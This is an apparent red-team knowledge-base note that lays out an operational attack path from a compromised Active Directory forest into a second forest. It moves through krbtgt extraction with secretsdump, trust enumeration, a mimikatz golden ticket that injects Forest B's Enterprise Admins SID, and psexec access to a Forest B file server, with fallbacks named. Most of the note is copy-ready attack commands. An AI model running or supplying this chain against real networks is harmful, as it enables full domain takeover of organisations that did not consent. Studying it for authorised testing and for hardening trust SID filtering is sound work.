---
title: "Attack Path: Forest A Compromise → SID History Trust Pivot → Forest B"
type: note
created: 2026-06-13
updated: 2026-06-13
tags: [attack-path, active-directory, trusts, lateral-movement]
---

# Attack Path: Forest A Compromise → SID History Trust Pivot → Forest B

Once you have `krbtgt` for one forest, a misconfigured trust to a second
forest can extend that compromise across the boundary. This is the "second
forest" pivot built on [[ad-trust-attacks]].

## Chain

```
You (krbtgt of Forest A, e.g. via [[dcsync]])
  --check trust to Forest B for SID history enabled--
  --if TREAT_AS_EXTERNAL--> forge Golden Ticket with Forest B's Enterprise Admins SID
  --present at Forest B resource--> access as Forest B EA
```

## Step 1 — Confirm Forest A compromise and obtain krbtgt
```bash
secretsdump.py corp-a.local/Administrator@dc01.corp-a.local -just-dc-user krbtgt
```
See [[dcsync]].

## Step 2 — Enumerate trusts from Forest A
```powershell
Get-DomainTrust
nltest /domain_trusts /all_trusts /v
```
Look for a forest trust to `corp-b.local`. Check whether SID filtering is
relaxed:
```powershell
Get-ADTrust -Identity corp-b.local | Select-Object Direction,ForestTransitive,SIDFilteringQuarantined
```
If `SIDFilteringQuarantined` is `False` and SID history is enabled
(`netdom trust ... /enablesidhistory:yes` was run at some point), the trust
is `TREAT_AS_EXTERNAL` — see [[ad-trust-attacks]].

## Step 3 — Forge a Golden Ticket carrying Forest B's Enterprise Admins SID
```powershell
# Forest B Enterprise Admins typically: S-1-5-21-<forest-b-root-sid>-519
kerberos::golden /user:Administrator /domain:corp-a.local /sid:S-1-5-21-<corp-a-sid> /krbtgt:<corp-a-krbtgt-aes256> /sids:S-1-5-21-<corp-b-root-sid>-519 /ptt
```

## Step 4 — Access a resource in Forest B
```bash
psexec.py -k -no-pass corp-a.local/Administrator@fileserver.corp-b.local
```
The DC for `corp-b.local` will honor the extra SID in the PAC because of
the relaxed filtering — granting Forest B Enterprise Admin-level access.

## If SID filtering is enforced (normal case)
Fall back to CVE-2020-0665-style techniques (patched Feb 2020 — check patch
level first) or standard means: credential reuse across the trust, abused
explicit cross-forest ACEs/group memberships, or [[shadow-credentials]] on
any Forest B account that Forest A principals have write access to.

## Related
- [[ad-trust-attacks]], [[ad-forest-trust-attacks]] — full SID filtering mechanics and CVE-2020-0665
- [[dcsync]], [[golden-silver-tickets]] — steps 1 and 3
- [[ad-persistence]] — once in Forest B, repeat domain-dominance persistence there too
